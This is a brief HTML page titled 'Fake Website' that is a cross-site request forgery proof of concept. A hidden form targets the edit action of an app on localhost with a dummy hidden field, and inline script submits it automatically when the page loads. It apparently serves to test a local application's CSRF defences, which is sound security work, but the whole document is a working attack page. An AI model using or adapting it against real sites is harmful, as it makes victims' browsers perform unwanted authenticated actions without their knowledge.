<!DOCTYPE html>
<html>
<body>

<h1>Fake Website</h1>

<form
    action="http://localhost:8000/public/index.php?action=edit&id=5"
    method="POST"
    id="csrf-form"
>

    <input type="hidden" name="test" value="123">

</form>

<script>
document.getElementById("csrf-form").submit();
</script>

</body>
</html>